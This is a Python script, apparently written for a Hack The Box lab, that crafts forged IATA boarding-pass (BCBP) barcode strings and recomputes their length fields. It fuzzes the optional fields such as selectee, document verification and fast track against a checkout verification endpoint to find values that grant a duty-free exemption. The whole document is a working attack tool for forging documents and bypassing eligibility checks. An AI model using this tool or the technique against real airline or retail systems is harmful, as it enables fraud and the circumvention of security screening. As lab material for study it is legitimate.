#!/usr/bin/env python3
"""
BCBP crafter + fuzzer v3 pour DutyBound (HTB).
Construit correctement le 'structured message repete' de la section
conditionnelle (item 17 = sa taille hex) et balaie les champs optionnels
IATA susceptibles de piloter l'eligibilite (selectee / intl doc verif /
fast track...). Recalcule item6, item10, item17.

Usage:
  python3 bcbp_fuzz3.py --target https://airsnacks.htb --cookie 'session=...' --mode logic3
  python3 bcbp_fuzz3.py --mode print --size 0F --idv 1
  python3 bcbp_fuzz3.py --mode print --size 2A --fast Y
Champs manuels (--mode print): --size (hex) + --num --serial --sel --idv --mkt --ffa --ffn --idad --bag --fast
"""
import argparse, json, sys
try:
    import requests; requests.packages.urllib3.disable_warnings()
except ImportError:
    requests=None

# Champs du message repete, dans l'ordre IATA, avec longueur fixe.
REPEATED_ORDER = [
    ("num",    3),   # Airline numeric code            -> 03
    ("serial", 10),  # Document form/serial number     -> 0D
    ("sel",    1),   # Selectee indicator              -> 0E
    ("idv",    1),   # International doc verification   -> 0F
    ("mkt",    3),   # Marketing carrier designator    -> 12
    ("ffa",    3),   # FF airline designator           -> 15
    ("ffn",    16),  # FF number                       -> 25
    ("idad",   1),   # ID/AD indicator                 -> 26
    ("bag",    3),   # Free baggage allowance          -> 29
    ("fast",   1),   # Fast track                      -> 2A
]
DEFAULTS = {"num":"057","serial":"0"*10,"sel":"0","idv":"0","mkt":"AF ",
            "ffa":"AF ","ffn":"0"*16,"idad":"0","bag":"0"*3,"fast":"N"}

def build_repeated(fields, upto):
    """Concatene les champs jusqu'a 'upto' inclus (nom de champ)."""
    out=""
    for name,ln in REPEATED_ORDER:
        v=(fields.get(name,DEFAULTS[name])+" "*ln)[:ln]
        out+=v
        if name==upto: break
    return out

def build(passenger="DOE/JOHN", pnr="ABC123", frm="CDG", to="HTB", carrier="AF",
          flight="0123", date="365", cabin="Y", seat="012A", seq="0001", pax="1",
          paxdesc="1", src_checkin="W", src_issue="W", date_issue="6319",
          doctype="B", issuer="AF", repeated="057"):
    mand=("M1"+passenger.ljust(20)[:20]+"E"+pnr.ljust(7)[:7]+frm.ljust(3)[:3]
          +to.ljust(3)[:3]+carrier.ljust(3)[:3]+flight.ljust(5)[:5]+date.ljust(3)[:3]
          +cabin[:1]+seat.ljust(4)[:4]+seq.ljust(5)[:5]+pax[:1])
    unique=(paxdesc[:1]+src_checkin[:1]+src_issue[:1]+date_issue.ljust(4)[:4]
            +doctype[:1]+issuer.ljust(3)[:3])
    item10=f"{len(unique):02X}"
    item17=f"{len(repeated):02X}"
    cond=">"+"6"+item10+unique+item17+repeated
    item6=f"{len(cond):02X}"
    return mand+item6+cond

def send(target,cookie,raw):
    h={"Content-Type":"application/json"}
    if cookie: h["Cookie"]=cookie
    r=requests.post(target.rstrip("/")+"/checkout/boarding-pass/verify",
                    headers=h,data=json.dumps({"raw":raw}),verify=False,timeout=15)
    return r.status_code, r.text[:400]

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--target"); ap.add_argument("--cookie",default="")
    ap.add_argument("--mode",choices=["logic3","print"],default="logic3")
    ap.add_argument("--size"); 
    for k,_ in REPEATED_ORDER: ap.add_argument("--"+k)
    a=ap.parse_args()

    if a.mode=="print":
        fields={k:getattr(a,k) for k,_ in REPEATED_ORDER if getattr(a,k)}
        # determine jusqu'ou aller d'apres --size, sinon jusqu'au dernier champ fourni
        size=int(a.size,16) if a.size else None
        if size:
            rep=""
            for name,ln in REPEATED_ORDER:
                rep+=(fields.get(name,DEFAULTS[name])+" "*ln)[:ln]
                if len(rep)>=size: break
            rep=rep[:size]
        else:
            last=[n for n,_ in REPEATED_ORDER if n in fields][-1] if fields else "num"
            rep=build_repeated(fields,last)
        print(build(repeated=rep)); return

    if requests is None: sys.exit("pip install requests")
    bsc,bbody=send(a.target,a.cookie,build(repeated="057"))
    print(f"[baseline 03] {bsc}  {bbody}\n{'='*70}")
    def rep(label,raw):
        sc,body=send(a.target,a.cookie,raw)
        hot=""
        for mk in ("exempt\": true","exempt\":true","AIRSIDE","INFLIGHT","ARRIVAL",
                   "DIPLOMATIC","INTERNATIONAL","true"):
            if mk.lower() in body.lower() and "exempt\":false" not in body.replace(" ",""):
                hot+=f" <<< {mk}"
        d="" if body==bbody else " [DIFF]"
        print(f"[{label:26}] {sc}{d}{hot}\n    {body[:200]}")

    # Pour chaque taille autorisee, balaie le DERNIER champ ajoute (0/1/blank/Y/N)
    sweeps = {
        "0E":("sel", ["0","1"," ","Y","N"]),
        "0F":("idv", ["0","1"," ","Y","N","V"]),
        "26":("idad",["0","1"," ","I","A","D"]),
        "2A":("fast",["0","1"," ","Y","N"]),
    }
    for size,(field,vals) in sweeps.items():
        print(f"### taille item17={size} -> champ {field} ###")
        for v in vals:
            fields={field:v}
            rep_bytes=""
            for name,ln in REPEATED_ORDER:
                rep_bytes+=(fields.get(name,DEFAULTS[name])+" "*ln)[:ln]
                if len(rep_bytes)>=int(size,16): break
            rep(f"{field}={v!r}", build(repeated=rep_bytes[:int(size,16)]))

if __name__=="__main__":
    main()
